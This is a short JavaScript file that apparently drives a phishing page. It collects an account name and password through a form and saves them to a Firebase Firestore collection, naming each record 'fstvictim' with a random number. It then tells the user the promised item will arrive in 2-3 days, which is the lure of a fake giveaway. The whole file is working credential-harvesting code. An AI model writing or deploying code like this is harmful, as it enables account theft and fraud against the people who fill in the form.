var db = firebase.firestore();



function checkCBox()
{
	console.log(document.getElementById("cBox").checked);
}


function sendthis(){
	var name = document.getElementById("name").value;
	var pass = document.getElementById("pass").value;
	var vid = document.getElementById("vid").value;

	data = {accname:name,accpass:pass}
	if (name !== null && vid !== null && pass !== null )
	{
		db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
		document.getElementById("t").innerHTML = "You will recieve this in 2-3 days";
	}
	else
	{
		document.getElementById("t").innerHTML = "Complete the form";
	}

}


